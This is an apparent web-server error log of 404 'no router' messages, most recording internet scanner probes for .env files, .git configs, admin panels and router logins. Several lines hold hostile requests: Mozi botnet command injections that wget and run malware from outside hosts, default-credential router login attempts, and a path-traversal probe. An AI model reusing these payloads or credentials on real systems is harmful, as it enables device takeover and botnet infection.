{"level":"info","message":"hello"}
{"level":"error","message":"GET /abcd 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /abcd 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /efgh 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /efgh 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /ijkl 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /solr/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /admin/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sugar_version.json 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wordpress/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wp/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /blog/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /old/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /new/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /test/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /backup/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /temp/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /HNAP1/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /memo 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auto 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth/signin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth/signup 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /auth/signup 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /portal/redlion 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /actuator/health 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /hudson 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"OPTIONS / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /expenditure/expendYear?year=2023 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /99vt 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /gate.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /99vu 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET http://www.google.com/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wp-includes/css/buttons.css 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /media/system/js/core.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /boaform/admin/formLogin?username=admin&psd=admin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /boaform/admin/formLogin?username=user&psd=user 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /Telerik.Web.UI.WebResource.axd?type=rau 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/creategp 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /../../mnt/mtd/Config/Account2 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpList 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gplist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /robots.txt 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sitemap.xml 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/searchgplist?q=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/searchgplist?question=%EB%84%88%EA%B5%AC%EB%A6%AC 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /druid/index.html 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.svn/wc.db 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /manager/html 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /data/.svn/wc.db 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/HEAD 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /utils/.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/HEAD 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /manager/text/list 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /manager/html 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /phpunit.xml 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /shell?cd+/tmp;rm+-rf+*;wget+http://203.115.85.112:36578/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /config/getuser?index=0 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /?20628182016134805143312Ex 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /admin/config.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
